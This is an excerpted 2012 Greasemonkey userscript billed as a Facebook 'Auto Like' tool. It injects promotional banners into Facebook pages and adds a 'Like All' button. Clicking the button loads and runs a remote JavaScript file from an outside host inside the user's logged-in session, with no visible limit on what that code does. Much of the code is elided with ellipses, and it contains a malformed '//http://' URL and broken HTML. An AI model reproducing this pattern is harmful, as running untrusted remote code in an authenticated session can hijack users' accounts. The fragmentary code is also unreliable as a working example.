// ==UserScript==
// @name			Facebook Auto Like  Becken
// @namespace			Becken Online
// @copyright			Becken Online . U
// @description			Auto Like
// @author			Becken Online
// @include			http://www.facebook.com/*
// @include			https://www.facebook.com/*
// @exclude			http://developers.facebook.com/*
// @exclude			https://developers.facebook.com/*
// Copyright (c) 2012, Becken Online
...
if(body != null) {
	...
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><a style='color: #FFFFFF;' <a href='http://www.facebook.com/becken.nimbuzzer' title='Click to See Becken Online's Profile on Facebook'> Becken's Profile </a></div>"
	...
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a href='http://nilamchy.xtgem.com/' target='_blank' title='Autolike Becken Online | Copyright 2012 | All Right Reserved' style='color: #FFFFFF;'>Autolike</a> | <a style='color: #FFFFFF;' onclick='thanks()'>#</a></div>"
...
if(body != null) {
	...
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://nilamchy.xtgem.com/images/asu.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='beckenlike()'>Like All</a>"
	
	body.appendChild(div);
	
	unsafeWindow.beckenlike = function() {
    javascript: (a = (b = document).createElement("script")).src = "//http://nilam.googlecode.com/files/asu.js",
...
if(body != null) {
	...
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://nilamchy.xtgem.com/images/asu.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='javascript:void(0);'>Liked:</a>"
